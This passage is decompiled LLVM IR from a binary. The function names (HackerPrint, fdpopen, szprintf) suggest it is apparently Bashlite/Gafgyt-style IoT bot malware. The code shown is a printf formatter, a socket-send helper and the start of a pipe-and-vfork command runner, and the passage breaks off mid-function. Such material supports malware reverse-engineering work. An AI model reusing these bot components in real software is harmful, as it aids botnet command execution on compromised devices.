dec_label_pc_10000a68:                            ; preds = %dec_label_pc_10000a38
  %v2_10000a6c = load i8, i8* %v5_10000a40, align 1
  %v3_10000a74 = icmp eq i8 %v2_10000a6c, 37
  br i1 %v3_10000a74, label %dec_label_pc_10000f94, label %dec_label_pc_10000a7c

dec_label_pc_10000a7c:                            ; preds = %dec_label_pc_10000a68
  %v2_10000a80 = load i8, i8* %v5_10000a40, align 1
  %v3_10000a88 = icmp eq i8 %v2_10000a80, 45
  br i1 %v3_10000a88, label %dec_label_pc_10000a90, label %dec_label_pc_10000ac0.preheader

dec_label_pc_10000a90:                            ; preds = %dec_label_pc_10000a7c
  %v1_10000a94 = add i32 %stack_var_-68.4.in33, 2
  %v5_10000a98 = inttoptr i32 %v1_10000a94 to i8*
  br label %dec_label_pc_10000ac0.preheader

dec_label_pc_10000ac0.preheader:                  ; preds = %dec_label_pc_10000a90, %dec_label_pc_10000a7c
  %stack_var_-68.0.ph = phi i8* [ %v5_10000a40, %dec_label_pc_10000a7c ], [ %v5_10000a98, %dec_label_pc_10000a90 ]
  %stack_var_-52.0.ph = phi i32 [ 0, %dec_label_pc_10000a7c ], [ 1, %dec_label_pc_10000a90 ]
  %v4_10000ac03 = ptrtoint i8* %stack_var_-68.0.ph to i32
  %v2_10000ac44 = load i8, i8* %stack_var_-68.0.ph, align 1
  %v3_10000acc8 = icmp eq i8 %v2_10000ac44, 48
  br i1 %v3_10000acc8, label %dec_label_pc_10000aa8, label %dec_label_pc_10000b0c.preheader

dec_label_pc_10000aa8:                            ; preds = %dec_label_pc_10000ac0.preheader, %dec_label_pc_10000aa8
  %v4_10000ac010 = phi i32 [ %v1_10000aac, %dec_label_pc_10000aa8 ], [ %v4_10000ac03, %dec_label_pc_10000ac0.preheader ]
  %stack_var_-52.09 = phi i32 [ %v1_10000ab8, %dec_label_pc_10000aa8 ], [ %stack_var_-52.0.ph, %dec_label_pc_10000ac0.preheader ]
  %v1_10000aac = add i32 %v4_10000ac010, 1
  %v5_10000ab0 = inttoptr i32 %v1_10000aac to i8*
  %v1_10000ab8 = or i32 %stack_var_-52.09, 2
  %v2_10000ac4 = load i8, i8* %v5_10000ab0, align 1
  %v3_10000acc = icmp eq i8 %v2_10000ac4, 48
  br i1 %v3_10000acc, label %dec_label_pc_10000aa8, label %dec_label_pc_10000b0c.preheader

dec_label_pc_10000b0c.preheader:                  ; preds = %dec_label_pc_10000aa8, %dec_label_pc_10000ac0.preheader
  %stack_var_-52.0.lcssa = phi i32 [ %stack_var_-52.0.ph, %dec_label_pc_10000ac0.preheader ], [ %v1_10000ab8, %dec_label_pc_10000aa8 ]
  %stack_var_-68.0.lcssa = phi i8* [ %stack_var_-68.0.ph, %dec_label_pc_10000ac0.preheader ], [ %v5_10000ab0, %dec_label_pc_10000aa8 ]
  %v4_10000b0c12 = ptrtoint i8* %stack_var_-68.0.lcssa to i32
  %v2_10000b1013 = load i8, i8* %stack_var_-68.0.lcssa, align 1
  %tmp62 = icmp ult i8 %v2_10000b1013, 48
  br i1 %tmp62, label %dec_label_pc_10000b34, label %dec_label_pc_10000b20

dec_label_pc_10000ad8:                            ; preds = %dec_label_pc_10000b20
  %v1_10000adc = mul i32 %stack_var_-48.018, 10
  %v2_10000ae8 = load i8, i8* %stack_var_-68.119, align 1
  %v3_10000ae8 = zext i8 %v2_10000ae8 to i32
  %v2_10000af4 = add i32 %v1_10000adc, -48
  %v1_10000af8 = add i32 %v2_10000af4, %v3_10000ae8
  %v1_10000b04 = add i32 %v4_10000b0c20, 1
  %v5_10000b08 = inttoptr i32 %v1_10000b04 to i8*
  %v2_10000b10 = load i8, i8* %v5_10000b08, align 1
  %tmp63 = icmp ult i8 %v2_10000b10, 48
  br i1 %tmp63, label %dec_label_pc_10000b34, label %dec_label_pc_10000b20

dec_label_pc_10000b20:                            ; preds = %dec_label_pc_10000b0c.preheader, %dec_label_pc_10000ad8
  %v4_10000b0c20 = phi i32 [ %v1_10000b04, %dec_label_pc_10000ad8 ], [ %v4_10000b0c12, %dec_label_pc_10000b0c.preheader ]
  %stack_var_-68.119 = phi i8* [ %v5_10000b08, %dec_label_pc_10000ad8 ], [ %stack_var_-68.0.lcssa, %dec_label_pc_10000b0c.preheader ]
  %stack_var_-48.018 = phi i32 [ %v1_10000af8, %dec_label_pc_10000ad8 ], [ 0, %dec_label_pc_10000b0c.preheader ]
  %v2_10000b24 = load i8, i8* %stack_var_-68.119, align 1
  %tmp64 = icmp ult i8 %v2_10000b24, 58
  br i1 %tmp64, label %dec_label_pc_10000ad8, label %dec_label_pc_10000b34

dec_label_pc_10000b34:                            ; preds = %dec_label_pc_10000ad8, %dec_label_pc_10000b20, %dec_label_pc_10000b0c.preheader
  %stack_var_-48.0.lcssa = phi i32 [ 0, %dec_label_pc_10000b0c.preheader ], [ %v1_10000af8, %dec_label_pc_10000ad8 ], [ %stack_var_-48.018, %dec_label_pc_10000b20 ]
  %stack_var_-68.1.lcssa = phi i8* [ %stack_var_-68.0.lcssa, %dec_label_pc_10000b0c.preheader ], [ %v5_10000b08, %dec_label_pc_10000ad8 ], [ %stack_var_-68.119, %dec_label_pc_10000b20 ]
  %v2_10000b38 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000b40 = icmp eq i8 %v2_10000b38, 115
  br i1 %v3_10000b40, label %dec_label_pc_10000b48, label %dec_label_pc_10000c08

dec_label_pc_10000b48:                            ; preds = %dec_label_pc_10000b34
  %v2_10000b4c = load i8, i8* %tmp, align 1
  %tmp65 = icmp ugt i8 %v2_10000b4c, 7
  br i1 %tmp65, label %dec_label_pc_10000b94, label %dec_label_pc_10000b5c

dec_label_pc_10000b5c:                            ; preds = %dec_label_pc_10000b48
  %v3_10000b60 = load i32, i32* %v2_10000b60, align 4
  %v2_10000b68 = load i8, i8* %tmp, align 1
  %v3_10000b68 = zext i8 %v2_10000b68 to i32
  %v1_10000b74 = mul nuw nsw i32 %v3_10000b68, 4
  %v2_10000b78 = add i32 %v1_10000b74, %v3_10000b60
  %v1_10000b80 = add i8 %v2_10000b68, 1
  store i8 %v1_10000b80, i8* %tmp, align 1
  br label %dec_label_pc_10000bac

dec_label_pc_10000b94:                            ; preds = %dec_label_pc_10000b48
  %v3_10000b98 = load i32, i32* %v2_10000b98, align 4
  %v1_10000ba0 = add i32 %v3_10000b98, 4
  store i32 %v1_10000ba0, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000bac

dec_label_pc_10000bac:                            ; preds = %dec_label_pc_10000b5c, %dec_label_pc_10000b94
  %stack_var_-20.0 = phi i32 [ %v3_10000b98, %dec_label_pc_10000b94 ], [ %v2_10000b78, %dec_label_pc_10000b5c ]
  %v1_10000bb0 = inttoptr i32 %stack_var_-20.0 to i32*
  %v2_10000bb0 = load i32, i32* %v1_10000bb0, align 4
  %v3_10000bbc = icmp eq i32 %v2_10000bb0, 0
  br i1 %v3_10000bbc, label %dec_label_pc_10000bd0, label %dec_label_pc_10000bc4

dec_label_pc_10000bc4:                            ; preds = %dec_label_pc_10000bac
  %v5_10000bc8 = inttoptr i32 %v2_10000bb0 to i8*
  br label %dec_label_pc_10000bdc

dec_label_pc_10000bd0:                            ; preds = %dec_label_pc_10000bac
  br label %dec_label_pc_10000bdc

dec_label_pc_10000bdc:                            ; preds = %dec_label_pc_10000bc4, %dec_label_pc_10000bd0
  %storemerge = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_100160e4.14, i32 0, i32 0), %dec_label_pc_10000bd0 ], [ %v5_10000bc8, %dec_label_pc_10000bc4 ]
  %v6_10000bf0 = call i32 @prints(i32 %tmp41, i8* %storemerge, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa)
  %v2_10000bfc = add i32 %v6_10000bf0, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000c08:                            ; preds = %dec_label_pc_10000b34
  %v2_10000c0c = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000c14 = icmp eq i8 %v2_10000c0c, 100
  br i1 %v3_10000c14, label %dec_label_pc_10000c1c, label %dec_label_pc_10000cbc

dec_label_pc_10000c1c:                            ; preds = %dec_label_pc_10000c08
  %v2_10000c20 = load i8, i8* %tmp, align 1
  %tmp66 = icmp ugt i8 %v2_10000c20, 7
  br i1 %tmp66, label %dec_label_pc_10000c68, label %dec_label_pc_10000c30

dec_label_pc_10000c30:                            ; preds = %dec_label_pc_10000c1c
  %v3_10000c34 = load i32, i32* %v2_10000b60, align 4
  %v2_10000c3c = load i8, i8* %tmp, align 1
  %v3_10000c3c = zext i8 %v2_10000c3c to i32
  %v1_10000c48 = mul nuw nsw i32 %v3_10000c3c, 4
  %v2_10000c4c = add i32 %v1_10000c48, %v3_10000c34
  %v1_10000c54 = add i8 %v2_10000c3c, 1
  store i8 %v1_10000c54, i8* %tmp, align 1
  br label %dec_label_pc_10000c80

dec_label_pc_10000c68:                            ; preds = %dec_label_pc_10000c1c
  %v3_10000c6c = load i32, i32* %v2_10000b98, align 4
  %v1_10000c74 = add i32 %v3_10000c6c, 4
  store i32 %v1_10000c74, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000c80

dec_label_pc_10000c80:                            ; preds = %dec_label_pc_10000c30, %dec_label_pc_10000c68
  %stack_var_-28.0 = phi i32 [ %v3_10000c6c, %dec_label_pc_10000c68 ], [ %v2_10000c4c, %dec_label_pc_10000c30 ]
  %v1_10000c84 = inttoptr i32 %stack_var_-28.0 to i32*
  %v2_10000c84 = load i32, i32* %v1_10000c84, align 4
  %v7_10000ca4 = call i32 @printi(i32 %tmp41, i32 %v2_10000c84, i32 10, i32 1, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 97)
  %v2_10000cb0 = add i32 %v7_10000ca4, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000cbc:                            ; preds = %dec_label_pc_10000c08
  %v2_10000cc0 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000cc8 = icmp eq i8 %v2_10000cc0, 120
  br i1 %v3_10000cc8, label %dec_label_pc_10000cd0, label %dec_label_pc_10000d70

dec_label_pc_10000cd0:                            ; preds = %dec_label_pc_10000cbc
  %v2_10000cd4 = load i8, i8* %tmp, align 1
  %tmp67 = icmp ugt i8 %v2_10000cd4, 7
  br i1 %tmp67, label %dec_label_pc_10000d1c, label %dec_label_pc_10000ce4

dec_label_pc_10000ce4:                            ; preds = %dec_label_pc_10000cd0
  %v3_10000ce8 = load i32, i32* %v2_10000b60, align 4
  %v2_10000cf0 = load i8, i8* %tmp, align 1
  %v3_10000cf0 = zext i8 %v2_10000cf0 to i32
  %v1_10000cfc = mul nuw nsw i32 %v3_10000cf0, 4
  %v2_10000d00 = add i32 %v1_10000cfc, %v3_10000ce8
  %v1_10000d08 = add i8 %v2_10000cf0, 1
  store i8 %v1_10000d08, i8* %tmp, align 1
  br label %dec_label_pc_10000d34

dec_label_pc_10000d1c:                            ; preds = %dec_label_pc_10000cd0
  %v3_10000d20 = load i32, i32* %v2_10000b98, align 4
  %v1_10000d28 = add i32 %v3_10000d20, 4
  store i32 %v1_10000d28, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000d34

dec_label_pc_10000d34:                            ; preds = %dec_label_pc_10000ce4, %dec_label_pc_10000d1c
  %stack_var_-32.0 = phi i32 [ %v3_10000d20, %dec_label_pc_10000d1c ], [ %v2_10000d00, %dec_label_pc_10000ce4 ]
  %v1_10000d38 = inttoptr i32 %stack_var_-32.0 to i32*
  %v2_10000d38 = load i32, i32* %v1_10000d38, align 4
  %v7_10000d58 = call i32 @printi(i32 %tmp41, i32 %v2_10000d38, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 97)
  %v2_10000d64 = add i32 %v7_10000d58, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000d70:                            ; preds = %dec_label_pc_10000cbc
  %v2_10000d74 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000d7c = icmp eq i8 %v2_10000d74, 88
  br i1 %v3_10000d7c, label %dec_label_pc_10000d84, label %dec_label_pc_10000e24

dec_label_pc_10000d84:                            ; preds = %dec_label_pc_10000d70
  %v2_10000d88 = load i8, i8* %tmp, align 1
  %tmp68 = icmp ugt i8 %v2_10000d88, 7
  br i1 %tmp68, label %dec_label_pc_10000dd0, label %dec_label_pc_10000d98

dec_label_pc_10000d98:                            ; preds = %dec_label_pc_10000d84
  %v3_10000d9c = load i32, i32* %v2_10000b60, align 4
  %v2_10000da4 = load i8, i8* %tmp, align 1
  %v3_10000da4 = zext i8 %v2_10000da4 to i32
  %v1_10000db0 = mul nuw nsw i32 %v3_10000da4, 4
  %v2_10000db4 = add i32 %v1_10000db0, %v3_10000d9c
  %v1_10000dbc = add i8 %v2_10000da4, 1
  store i8 %v1_10000dbc, i8* %tmp, align 1
  br label %dec_label_pc_10000de8

dec_label_pc_10000dd0:                            ; preds = %dec_label_pc_10000d84
  %v3_10000dd4 = load i32, i32* %v2_10000b98, align 4
  %v1_10000ddc = add i32 %v3_10000dd4, 4
  store i32 %v1_10000ddc, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000de8

dec_label_pc_10000de8:                            ; preds = %dec_label_pc_10000d98, %dec_label_pc_10000dd0
  %stack_var_-36.0 = phi i32 [ %v3_10000dd4, %dec_label_pc_10000dd0 ], [ %v2_10000db4, %dec_label_pc_10000d98 ]
  %v1_10000dec = inttoptr i32 %stack_var_-36.0 to i32*
  %v2_10000dec = load i32, i32* %v1_10000dec, align 4
  %v7_10000e0c = call i32 @printi(i32 %tmp41, i32 %v2_10000dec, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 65)
  %v2_10000e18 = add i32 %v7_10000e0c, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000e24:                            ; preds = %dec_label_pc_10000d70
  %v2_10000e28 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000e30 = icmp eq i8 %v2_10000e28, 117
  br i1 %v3_10000e30, label %dec_label_pc_10000e38, label %dec_label_pc_10000ed8

dec_label_pc_10000e38:                            ; preds = %dec_label_pc_10000e24
  %v2_10000e3c = load i8, i8* %tmp, align 1
  %tmp69 = icmp ugt i8 %v2_10000e3c, 7
  br i1 %tmp69, label %dec_label_pc_10000e84, label %dec_label_pc_10000e4c

dec_label_pc_10000e4c:                            ; preds = %dec_label_pc_10000e38
  %v3_10000e50 = load i32, i32* %v2_10000b60, align 4
  %v2_10000e58 = load i8, i8* %tmp, align 1
  %v3_10000e58 = zext i8 %v2_10000e58 to i32
  %v1_10000e64 = mul nuw nsw i32 %v3_10000e58, 4
  %v2_10000e68 = add i32 %v1_10000e64, %v3_10000e50
  %v1_10000e70 = add i8 %v2_10000e58, 1
  store i8 %v1_10000e70, i8* %tmp, align 1
  br label %dec_label_pc_10000e9c

dec_label_pc_10000e84:                            ; preds = %dec_label_pc_10000e38
  %v3_10000e88 = load i32, i32* %v2_10000b98, align 4
  %v1_10000e90 = add i32 %v3_10000e88, 4
  store i32 %v1_10000e90, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000e9c

dec_label_pc_10000e9c:                            ; preds = %dec_label_pc_10000e4c, %dec_label_pc_10000e84
  %stack_var_-40.0 = phi i32 [ %v3_10000e88, %dec_label_pc_10000e84 ], [ %v2_10000e68, %dec_label_pc_10000e4c ]
  %v1_10000ea0 = inttoptr i32 %stack_var_-40.0 to i32*
  %v2_10000ea0 = load i32, i32* %v1_10000ea0, align 4
  %v7_10000ec0 = call i32 @printi(i32 %tmp41, i32 %v2_10000ea0, i32 10, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 97)
  %v2_10000ecc = add i32 %v7_10000ec0, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000ed8:                            ; preds = %dec_label_pc_10000e24
  %v2_10000edc = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000ee4 = icmp eq i8 %v2_10000edc, 99
  br i1 %v3_10000ee4, label %dec_label_pc_10000eec, label %dec_label_pc_10000fb8

dec_label_pc_10000eec:                            ; preds = %dec_label_pc_10000ed8
  %v2_10000ef0 = load i8, i8* %tmp, align 1
  %tmp70 = icmp ugt i8 %v2_10000ef0, 7
  br i1 %tmp70, label %dec_label_pc_10000f38, label %dec_label_pc_10000f00

dec_label_pc_10000f00:                            ; preds = %dec_label_pc_10000eec
  %v3_10000f04 = load i32, i32* %v2_10000b60, align 4
  %v2_10000f0c = load i8, i8* %tmp, align 1
  %v3_10000f0c = zext i8 %v2_10000f0c to i32
  %v1_10000f18 = mul nuw nsw i32 %v3_10000f0c, 4
  %v2_10000f1c = add i32 %v1_10000f18, %v3_10000f04
  %v1_10000f24 = add i8 %v2_10000f0c, 1
  store i8 %v1_10000f24, i8* %tmp, align 1
  br label %dec_label_pc_10000f50

dec_label_pc_10000f38:                            ; preds = %dec_label_pc_10000eec
  %v3_10000f3c = load i32, i32* %v2_10000b98, align 4
  %v1_10000f44 = add i32 %v3_10000f3c, 4
  store i32 %v1_10000f44, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000f50

dec_label_pc_10000f50:                            ; preds = %dec_label_pc_10000f00, %dec_label_pc_10000f38
  %stack_var_-44.0 = phi i32 [ %v3_10000f3c, %dec_label_pc_10000f38 ], [ %v2_10000f1c, %dec_label_pc_10000f00 ]
  %v1_10000f54 = inttoptr i32 %stack_var_-44.0 to i32*
  %v2_10000f54 = load i32, i32* %v1_10000f54, align 4
  %v1_10000f58 = urem i32 %v2_10000f54, 256
  store i32 %v1_10000f58, i32* %stack_var_-88, align 4
  %v5_10000f7c = call i32 @prints(i32 %tmp41, i8* %v4_10000f7c, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa)
  %v2_10000f88 = add i32 %v5_10000f7c, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000f94:                            ; preds = %dec_label_pc_10000a24, %dec_label_pc_10000a68
  %stack_var_-68.2 = phi i8* [ %v5_10000a40, %dec_label_pc_10000a68 ], [ %stack_var_-68.434, %dec_label_pc_10000a24 ]
  %v2_10000f98 = load i8, i8* %stack_var_-68.2, align 1
  %v3_10000f98 = zext i8 %v2_10000f98 to i32
  %v3_10000fa8 = call i32 @printchar(i32* %arg1, i32 %v3_10000f98)
  %v1_10000fb0 = add i32 %stack_var_-56.132, 1
  br label %dec_label_pc_10000fb8

dec_label_pc_10000fb8:                            ; preds = %dec_label_pc_10000ed8, %dec_label_pc_10000f50, %dec_label_pc_10000e9c, %dec_label_pc_10000de8, %dec_label_pc_10000d34, %dec_label_pc_10000c80, %dec_label_pc_10000bdc, %dec_label_pc_10000f94
  %stack_var_-56.0 = phi i32 [ %v1_10000fb0, %dec_label_pc_10000f94 ], [ %v2_10000bfc, %dec_label_pc_10000bdc ], [ %v2_10000cb0, %dec_label_pc_10000c80 ], [ %v2_10000d64, %dec_label_pc_10000d34 ], [ %v2_10000e18, %dec_label_pc_10000de8 ], [ %v2_10000ecc, %dec_label_pc_10000e9c ], [ %v2_10000f88, %dec_label_pc_10000f50 ], [ %stack_var_-56.132, %dec_label_pc_10000ed8 ]
  %stack_var_-68.3 = phi i8* [ %stack_var_-68.2, %dec_label_pc_10000f94 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000bdc ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000c80 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000d34 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000de8 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000e9c ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000f50 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000ed8 ]
  %v4_10000fb8 = ptrtoint i8* %stack_var_-68.3 to i32
  %v1_10000fbc = add i32 %v4_10000fb8, 1
  %stack_var_-68.4 = inttoptr i32 %v1_10000fbc to i8*
  %v2_10000fc8 = load i8, i8* %stack_var_-68.4, align 1
  %v3_10000fd0 = icmp eq i8 %v2_10000fc8, 0
  br i1 %v3_10000fd0, label %dec_label_pc_10000fd8, label %dec_label_pc_10000a24

dec_label_pc_10000fd8:                            ; preds = %dec_label_pc_10000a38, %dec_label_pc_10000fb8, %entry
  %stack_var_-56.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-56.132, %dec_label_pc_10000a38 ], [ %stack_var_-56.0, %dec_label_pc_10000fb8 ]
  %v3_10000fdc = icmp eq i32* %arg1, null
  br i1 %v3_10000fdc, label %dec_label_pc_10000ff4, label %dec_label_pc_10000fe4

dec_label_pc_10000fe4:                            ; preds = %dec_label_pc_10000fd8
  %v2_10000fe8 = load i32, i32* %arg1, align 4
  %v3_10000ff0 = inttoptr i32 %v2_10000fe8 to i8*
  store i8 0, i8* %v3_10000ff0, align 1
  br label %dec_label_pc_10000ff4

dec_label_pc_10000ff4:                            ; preds = %dec_label_pc_10000fd8, %dec_label_pc_10000fe4
  ret i32 %stack_var_-56.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_-68.4, { 1, 0 }
  uselistorder i8* %stack_var_-68.1.lcssa, { 12, 11, 9, 7, 5, 3, 1, 10, 8, 6, 4, 2, 0 }
  uselistorder i32 %stack_var_-48.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %stack_var_-68.0.lcssa, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-52.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10000aac, { 1, 0 }
  uselistorder i32 %stack_var_-52.0.ph, { 1, 0 }
  uselistorder i8* %v5_10000a40, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-56.132, { 0, 8, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %stack_var_-68.4.in33, { 1, 0 }
  uselistorder i32* %v2_10000b98, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 10, 11 }
  uselistorder i32* %stack_var_-88, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @printi, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32)* @prints, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_10000ff4, { 1, 0 }
  uselistorder label %dec_label_pc_10000fd8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10000fb8, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_10000f94, { 1, 0 }
  uselistorder label %dec_label_pc_10000f50, { 1, 0 }
  uselistorder label %dec_label_pc_10000e9c, { 1, 0 }
  uselistorder label %dec_label_pc_10000de8, { 1, 0 }
  uselistorder label %dec_label_pc_10000d34, { 1, 0 }
  uselistorder label %dec_label_pc_10000c80, { 1, 0 }
  uselistorder label %dec_label_pc_10000bdc, { 1, 0 }
  uselistorder label %dec_label_pc_10000bac, { 1, 0 }
  uselistorder label %dec_label_pc_10000b34, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10000b20, { 1, 0 }
  uselistorder label %dec_label_pc_10000aa8, { 1, 0 }
  uselistorder label %dec_label_pc_10000a24, { 1, 0 }
}

define i32 @zprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-136 = alloca i32, align 4
  store i32 1, i32* %stack_var_-136, align 4
  %v2_10001094 = ptrtoint i32* %stack_var_-136 to i32
  store i32 268439712, i32* @lr, align 4
  %v4_1000109c = call i32 @print(i32* null, i32 %arg1, i32 %v2_10001094)
  ret i32 %v4_1000109c

; uselistorder directives
  uselistorder i32* %stack_var_-136, { 1, 0 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-120, align 4
  store i32 2, i32* %stack_var_-136, align 4
  %v2_10001144 = ptrtoint i32* %stack_var_-136 to i32
  store i32 268439888, i32* @lr, align 4
  %v4_1000114c = call i32 @print(i32* nonnull %stack_var_-120, i32 %arg2, i32 %v2_10001144)
  ret i32 %v4_1000114c

; uselistorder directives
  uselistorder i32* %stack_var_-136, { 1, 0 }
}

define i32 @HackerPrint(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  store i32 268440016, i32* @lr, align 4
  %v1_100011cc = call i32 @malloc(i32 2048)
  store i32 %v1_100011cc, i32* %stack_var_-144, align 4
  store i32 268440048, i32* @lr, align 4
  %v3_100011ec = call i32 @__GI_memset(i32 %v1_100011cc, i32 0, i32 2048)
  store i32 2, i32* %stack_var_-140, align 4
  %v2_10001220 = ptrtoint i32* %stack_var_-140 to i32
  store i32 268440116, i32* @lr, align 4
  %v4_10001230 = call i32 @print(i32* nonnull %stack_var_-144, i32 %arg2, i32 %v2_10001220)
  store i32 %v1_100011cc, i32* @r3, align 4
  %v0_10001238 = call i32 @__GI_strlen()
  %v2_10001248 = add i32 %v0_10001238, %v1_100011cc
  %v3_10001250 = inttoptr i32 %v2_10001248 to i8*
  store i8 10, i8* %v3_10001250, align 1
  store i32 %v1_100011cc, i32* @r3, align 4
  %v0_10001258 = call i32 @__GI_strlen()
  store i32 268440180, i32* @lr, align 4
  %v4_10001270 = call i32 @__libc_send(i32 %arg1, i32 %v1_100011cc, i32 %v0_10001258, i32 16384)
  store i32 268440196, i32* @lr, align 4
  %v1_10001280 = call i32 @free(i32 %v1_100011cc)
  ret i32 %v4_10001270

; uselistorder directives
  uselistorder i32 %v1_100011cc, { 1, 4, 2, 0, 3, 5, 6 }
  uselistorder i32* %stack_var_-140, { 1, 0 }
}

define i32 @fdpopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-48 = alloca i32, align 4
  %v2_100012c4 = load i8, i8* %arg2, align 1
  %v3_100012cc = icmp eq i8 %v2_100012c4, 114
  br i1 %v3_100012cc, label %dec_label_pc_100012e8, label %dec_label_pc_100012d4

dec_label_pc_100012d4:                            ; preds = %entry
  %v2_100012d8 = load i8, i8* %arg2, align 1
  %v3_100012e0 = icmp eq i8 %v2_100012d8, 119
  br i1 %v3_100012e0, label %dec_label_pc_100012e8, label %dec_label_pc_10001300

dec_label_pc_100012e8:                            ; preds = %dec_label_pc_100012d4, %entry
  %v1_100012ec = add i32 %tmp, 1
  %v2_100012ec = inttoptr i32 %v1_100012ec to i8*
  %v3_100012f0 = load i8, i8* %v2_100012ec, align 1
  %v3_100012f8 = icmp eq i8 %v3_100012f0, 0
  br i1 %v3_100012f8, label %dec_label_pc_1000130c, label %dec_label_pc_10001300

dec_label_pc_10001300:                            ; preds = %dec_label_pc_100012d4, %dec_label_pc_100012e8
  br label %dec_label_pc_10001530

dec_label_pc_1000130c:                            ; preds = %dec_label_pc_100012e8
  %v2_1000130c = ptrtoint i32* %stack_var_-48 to i32
  store i32 268440344, i32* @lr, align 4
  %v3_10001314 = call i32 @__GI_pipe(i32 %v2_1000130c, i32 %v1_100012ec)
  store i32 %v3_10001314, i32* @r3, align 4
  %tmp15 = icmp sgt i32 %v3_10001314, -1
  br i1 %tmp15, label %dec_label_pc_10001330, label %dec_label_pc_10001324

dec_label_pc_10001324:                            ; preds = %dec_label_pc_1000130c
  br label %dec_label_pc_10001530

dec_label_pc_10001330:                            ; preds = %dec_label_pc_1000130c
  %v3_10001334 = load i32, i32* @global_var_1002c900.15, align 4
  %v3_10001338 = icmp eq i32 %v3_10001334, 0
  br i1 %v3_10001338, label %dec_label_pc_10001340, label %dec_label_pc_100013c0

dec_label_pc_10001340:                            ; preds = %dec_label_pc_10001330
  store i32 268440388, i32* @lr, align 4
  %v0_10001340 = call i32 @getdtablesize()
  %v2_10001350 = icmp sgt i32 %v0_10001340, 0
  br i1 %v2_10001350, label %dec_label_pc_10001364, label %dec_label_pc_10001358

dec_label_pc_10001358:                            ; preds = %dec_label_pc_10001340
  br label %dec_label_pc_10001530

dec_label_pc_10001364:                            ; preds = %dec_label_pc_10001340
  %v1_10001368 = mul i32 %v0_10001340, 4
  store i32 268440436, i32* @lr, align 4
  %v1_10001370 = call i32 @malloc(i32 %v1_10001368)
  store i32 %v1_10001370, i32* @global_var_1002c900.15, align 4
  %v3_10001388 = icmp eq i32 %v1_10001370, 0
  br i1 %v3_10001388, label %dec_label_pc_10001390, label %dec_label_pc_1000139c

dec_label_pc_10001390:                            ; preds = %dec_label_pc_10001364
  br label %dec_label_pc_10001530

dec_label_pc_1000139c:                            ; preds = %dec_label_pc_10001364
  store i32 ptrtoint (i32* @global_var_100013c0.16 to i32), i32* @lr, align 4
  %v3_100013bc = call i32 @__GI_memset(i32 %v1_10001370, i32 0, i32 %v1_10001368)
  store i32 %v3_100013bc, i32* @r3, align 4
  br label %dec_label_pc_100013c0

dec_label_pc_100013c0:                            ; preds = %dec_label_pc_10001330, %dec_label_pc_1000139c
  store i32 268440516, i32* @lr, align 4
  %v0_100013c0 = call i32 @__vfork()
  %v4_100013dc = icmp eq i32 %v0_100013c0, -1
  br i1 %v4_100013dc, label %dec_label_pc_100013f4, label %dec_label_pc_100013e4

dec_label_pc_100013e4:                            ; preds = %dec_label_pc_100013c0
  %v3_100013e8 = icmp eq i32 %v0_100013c0, 0
